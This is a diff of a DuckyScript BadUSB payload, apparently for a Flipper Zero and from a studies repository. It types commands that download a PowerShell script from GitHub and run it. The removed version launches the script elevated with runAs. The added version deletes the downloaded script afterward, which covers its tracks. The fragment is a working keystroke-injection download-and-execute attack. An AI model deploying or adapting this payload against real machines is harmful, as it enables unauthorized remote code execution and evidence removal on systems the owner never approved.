@@ -16,7 +16,14 @@ ENTER
 DELAY 1500
 
 REM Downloading the deleteFile.ps1 from GitHub and running it
-STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', 'deleteFile.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File deleteFile.ps1"}, exit
+STRING Invoke-WebRequest 'https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1' -OutFile ./deleteFile.ps1
+ENTER
+STRING .\deleteFile.ps1
+ENTER
+DELAY 1000
+
+REM Deleting the deleteFile.ps1
+STRING Remove-Item -path  .\deleteFile.ps1
 ENTER
 
 REM Test Case
